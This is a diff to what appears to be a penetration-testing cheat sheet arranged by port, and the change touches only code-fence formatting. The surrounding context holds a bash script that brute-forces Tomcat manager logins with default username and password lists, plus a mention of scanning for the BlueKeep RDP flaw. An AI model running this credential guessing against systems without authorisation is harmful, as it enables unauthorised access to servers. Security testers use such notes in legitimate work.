@@ -177,7 +177,7 @@ Includes web services (not just port 80)
       - If build steps/commands exist, move yours to the top. If any step fails, it cancels the subsequent ones
 - Check for Splunk
 - Check for Tomcat:
-  ```
+```
   #!/bin/bash
   USERS="tomcat admin manager role role1 root"
   PASSS="password Password1 password1 admin tomcat tomcat manager role1 tomcat changethis Password1 changethis password password1 r00t root toor tomcat s3cret password1 password admin changethis"
@@ -192,7 +192,7 @@ Includes web services (not just port 80)
       curl -s -k -i http://$USER:@$HOST/manager/html | grep '200 OK'
     done
   done
-  ```
+```
 
 ## TCP/3389 Remote Desktop Protocol (RDP)
 - Scan for BlueKeep:
